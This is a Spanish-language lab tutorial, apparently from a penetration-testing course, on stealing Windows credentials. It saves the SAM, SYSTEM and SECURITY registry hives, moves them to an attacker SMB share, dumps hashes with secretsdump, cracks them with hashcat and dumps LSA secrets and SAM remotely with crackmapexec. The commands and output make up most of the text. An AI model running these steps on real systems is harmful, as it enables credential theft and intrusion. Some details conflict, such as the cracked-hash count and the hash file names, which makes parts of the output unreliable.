# Attacking SAM

## Copiando Hives del Registro SAM

Con acceso a un sistema Windows que no esté unido a un dominio, podemos beneficiarnos al intentar copiar rápidamente los archivos asociados con la base de datos SAM para transferirlos a nuestro host de ataque y comenzar a crackear los hashes fuera de línea. Hacer esto fuera de línea nos permitirá continuar nuestros ataques sin mantener una sesión activa con el objetivo. Vamos a recorrer este proceso juntos utilizando un host objetivo. Siéntete libre de seguir adelante al crear la caja de destino en esta sección.

Hay tres hives del registro que podemos copiar si tenemos acceso de administrador local en el objetivo; cada uno tendrá un propósito específico cuando lleguemos a volcar y crackear los hashes. A continuación se presenta una breve descripción de cada uno en la tabla:

| Hive del Registro | Descripción                                                                                                                                                                             |
| ----------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| hklm\sam          | Contiene los hashes asociados con las contraseñas de las cuentas locales. Necesitaremos los hashes para crackearlos y obtener las contraseñas de las cuentas de usuario en texto claro. |
| hklm\system       | Contiene la clave de arranque del sistema, que se utiliza para cifrar la base de datos SAM. Necesitaremos la clave de arranque para descifrar la base de datos SAM.                     |
| hklm\security     | Contiene credenciales en caché para cuentas de dominio. Puede ser útil tener esto en un objetivo unido a un dominio.                                                                    |

Podemos crear copias de seguridad de estos hives utilizando la utilidad `reg.exe`.

## Usando reg.exe para Copiar Hives del Registro

Lanzar CMD como administrador nos permitirá ejecutar `reg.exe` para guardar copias de los hives del registro mencionados anteriormente. Ejecuta los siguientes comandos para hacerlo:

```plaintext
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
La operación se completó correctamente.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
La operación se completó correctamente.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
La operación se completó correctamente.
```

Técnicamente, solo necesitaremos `hklm\sam` y `hklm\system`, pero `hklm\security` también puede ser útil guardarlo, ya que puede contener hashes asociados con credenciales de cuentas de usuario de dominio en caché presentes en hosts unidos a un dominio. Una vez que los hives se guardan fuera de línea, podemos utilizar varios métodos para transferirlos a nuestro host de ataque. En este caso, utilizaremos `smbserver.py` de Impacket en combinación con algunos comandos útiles de CMD para mover las copias de los hives a un recurso compartido creado en nuestro host de ataque.

## Creando un Recurso Compartido con smbserver.py

Todo lo que debemos hacer para crear el recurso compartido es ejecutar `smbserver.py -smb2support` usando Python, darle un nombre al recurso compartido (CompData) y especificar el directorio en nuestro host de ataque donde se almacenarán las copias de los hives (`/home/ltnbob/Documents`). Ten en cuenta que la opción `-smb2support` asegurará que se admitan versiones más nuevas de SMB. Si no usamos esta bandera, habrá errores al conectarse desde el objetivo Windows al recurso compartido alojado en nuestro host de ataque. Las versiones más nuevas de Windows no admiten SMBv1 de forma predeterminada debido a las numerosas vulnerabilidades severas y exploits públicos disponibles.

```bash
sherlock28@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Archivo de configuración analizado
[*] Callback agregado para UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback agregado para UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Archivo de configuración analizado
[*] Archivo de configuración analizado
[*] Archivo de configuración analizado
```

Una vez que tengamos el recurso compartido en funcionamiento en nuestro host de ataque, podemos usar el comando `move` en el objetivo Windows para mover las copias de los hives al recurso compartido.

## Moviendo Copias de los Hives al Recurso Compartido

```plaintext
C:\> move sam.save \\10.10.15.16\CompData
1 archivo(s) movido.

C:\> move security.save \\10.10.15.16\CompData
1 archivo(s) movido.

C:\> move system.save \\10.10.15.16\CompData
1 archivo(s) movido.
```

Luego podemos confirmar que nuestras copias de los hives se movieron con éxito al recurso compartido navegando al directorio compartido en nuestro host de ataque y usando `ls` para listar los archivos.

## Confirmando que las Copias de los Hives se Transfirieron al Host de Ataque

```bash
sherlock28@htb[/htb]$ ls
sam.save  security.save  system.save
```

## Volcando Hashes con secretsdump.py de Impacket

Una herramienta increíblemente útil que podemos utilizar para volcar los hashes fuera de línea es `secretsdump.py` de Impacket. Impacket se puede encontrar en la mayoría de las distribuciones modernas de pruebas de penetración. Podemos buscarlo usando `locate` en un sistema basado en Linux:

### Localizando secretsdump.py

```bash
sherlock28@htb[/htb]$ locate secretsdump
```

Usar `secretsdump.py` es un proceso simple. Todo lo que debemos hacer es ejecutar `secretsdump.py` usando Python y luego especificar cada archivo hive que recuperamos del host objetivo.

### Ejecutando secretsdump.py

```bash
sherlock28@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Clave de arranque del sistema objetivo: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Volcando hashes locales de SAM (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
[*] Volcando información de inicio de sesión en caché del dominio (dominio/usuario:hash)
[*] Volcando secretos LSA
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
[*] NL$KM 
 0000   D7 0A F4 B9 1E 3E 77 34  94 8F C4 7D AC 8F 60 69   .....>w4...}..`i
 0010   52 E1 2B 74 FF B2 08 5F  59 FE 32 19 D6 A7 2C F8   R.+t..._Y.2...,.
 0020   68 F2 9F 2B A6 A0 C0 5D 65  72 88 71 C5 9F D2 3D 4B   h..+... ]er.q....K
 0030   0A 5B 5B 92 2A 89 06 D2 4A  8E 6C F3 E5 C5 71 45 B8   .[[.*...J.l...qE.
```

Al final de la ejecución, obtendremos todos los hashes asociados con los usuarios locales y la información de las contraseñas que podemos intentar crackear fuera de línea utilizando herramientas como `John the Ripper` o `hashcat`. Así, ¡con eso completamos nuestra técnica de copia de hives de registro!

## Cracking Hashes with Hashcat

Una vez que tengamos los hashes, podemos comenzar a intentar crackearlos usando Hashcat. Utilizaremos Hashcat para intentar crackear los hashes que hemos recopilado. Si echamos un vistazo al sitio web de Hashcat, notaremos que admite una amplia variedad de algoritmos de hashing. En este módulo, utilizamos Hashcat para casos de uso específicos. Esto nos ayudará a desarrollar la mentalidad y comprensión necesarias para usar Hashcat, así como a saber cuándo necesitamos consultar la documentación de Hashcat para entender qué modo y opciones debemos utilizar según los hashes que capturemos.

Como se mencionó anteriormente, podemos llenar un archivo de texto con los NT hashes que pudimos volcar.

### Agregando NT Hashes a un Archivo .txt

```bash
sherlock28@htb[/htb]$ sudo vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

Ahora que los NT hashes están en nuestro archivo de texto (`hashestocrack.txt`), podemos usar Hashcat para crackearlos.

### Ejecutando Hashcat contra NT Hashes

Hashcat tiene muchos modos diferentes que podemos usar. Seleccionar un modo depende en gran medida del tipo de ataque y el tipo de hash que queremos crackear. Cubrir cada modo está más allá del alcance de este módulo. Nos enfocaremos en usar `-m` para seleccionar el tipo de hash 1000 para crackear nuestros NT hashes (también conocidos como hashes basados en NTLM). Podemos consultar la página wiki de Hashcat o la página de manual para ver los tipos de hash admitidos y su número asociado. Utilizaremos la infame lista de palabras `rockyou.txt` mencionada en la sección de Almacenamiento de Credenciales de este módulo.

```bash
sherlock28@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon          
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme         
184ecdda8cf1dd238d438c4aea4d560d:adrian          
31d6cfe0d16ae931b73c59d7e0c089c0:                 

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: dumpedhashes.txt
Time.Started.....: Tue Dec 14 14:16:56 2021 (0 secs)
Time.Estimated...: Tue Dec 14 14:16:56 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    14284 H/s (0.63ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 5/5 (100.00%) Digests
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: newzealand -> whitetiger

Started: Tue Dec 14 14:16:50 2021
Stopped: Tue Dec 14 14:16:58 2021
```

Podemos ver en la salida que Hashcat utilizó un tipo de ataque llamado ataque por diccionario para adivinar rápidamente las contraseñas utilizando una lista de contraseñas conocidas (`rockyou.txt`) y tuvo éxito en crackear 3 de los hashes. Tener las contraseñas podría ser útil para nosotros de muchas maneras. Podríamos intentar usar las contraseñas que crackeamos para acceder a otros sistemas en la red. Es muy común que las personas reutilicen contraseñas en diferentes cuentas de trabajo y personales. Conociendo esta técnica, que cubrimos, puede ser útil en compromisos. Nos beneficiará usar esto cada vez que nos encontremos con un sistema Windows vulnerable y obtengamos derechos de administrador para volcar la base de datos SAM.

Tengan en cuenta que esta es una técnica bien conocida, por lo que los administradores pueden tener salvaguardas para prevenirla y detectarla. Algunas de estas formas están documentadas en el marco de ataque de MITRE.

## Consideraciones sobre Dumping Remoto y LSA Secrets

Con acceso a credenciales con privilegios de administrador local, también es posible que podamos apuntar a LSA Secrets a través de la red. Esto podría permitirnos extraer credenciales de un servicio en ejecución, tarea programada o aplicación que utiliza LSA secrets para almacenar contraseñas.

### Dumping LSA Secrets Remotamente

```bash
sherlock28@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets y /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
```

### Dumping SAM Remotamente

También podemos volcar hashes de la base de datos SAM de forma remota.

```bash
sherlock28@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes
SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01      bob:1000:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
```

Podemos ver que pudimos volcar la base de datos SAM, obteniendo credenciales útiles que también podemos crackear usando Hashcat o con otras técnicas.
